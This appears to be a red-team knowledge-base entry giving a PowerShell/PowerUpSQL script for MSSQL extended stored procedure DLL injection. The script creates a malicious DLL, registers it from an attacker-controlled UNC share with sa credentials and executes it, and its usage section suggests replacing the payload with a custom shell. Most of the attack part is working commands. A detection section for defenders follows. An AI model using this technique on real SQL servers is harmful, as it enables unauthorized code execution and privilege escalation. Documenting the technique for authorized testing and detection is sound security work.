---
id: a086c786-792c-4537-a37d-75fe4f24e5e4
name: powershell-mssql-extended-proc-dll-injection-script
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:20.295292+00:00'
updated_at: '2023-04-10T20:36:30.723251+00:00'
platforms:
  - Windows
tags:
  - mssql
  - dll-injection
  - powershell
validated: true
---

# powershell-mssql-extended-proc-dll-injection-script

## Code

```ps1
# Create evil DLL
Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test

# Load the DLL and call xp_test
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "sp_addextendedproc 'xp_test', '\\10.10.0.1\temp\test.dll'"
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "EXEC xp_test"

# Listing existing
Get-SQLStoredProcedureXP -Instance "<DBSERVERNAME\DBInstance>" -Verbose
```

## Description

This PowerShell script performs the full MSSQL extended stored procedure DLL injection: creates a malicious DLL with a payload, loads it onto the target server via UNC path, executes it, and lists procedures for verification. It requires the PowerUpSQL module and uses hardcoded credentials for demonstration.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <DBSERVERNAME\DBInstance> | Target SQL Server instance name | DBSERVERNAME\SQLEXPRESS |
| sa | SQL username (hardcoded) | sa |
| Password1234 | SQL password (hardcoded; replace in production) | StrongPassword123! |
| \\10.10.0.1\temp\test.dll | UNC path to the DLL | \\ATTACKER_IP\share\test.dll |
| echo test > c:\temp\test.txt | Payload command (embedded) | Custom shell or file creation |

## Usage

Run this script from a PowerShell session with PowerUpSQL imported after creating an SMB share for the DLL. Customize credentials, instance, and payload before execution. Ideal for red team simulations targeting MSSQL for privilege escalation.

## Detection

- Monitor PowerShell execution logs for PowerUpSQL module imports and Get-SQLQuery calls.
- SQL audit logs for sp_addextendedproc and EXEC on new xp_* procedures.
- File system changes (e.g., test.txt creation) and anomalous SMB shares.
- Process injection indicators in SQL Server (sqlservr.exe) via EDR tools.

## Related

- [[procedures/mssql-server-extended-stored-procedure-dll-injection]]
- [[tools/PowerUpSQL]]
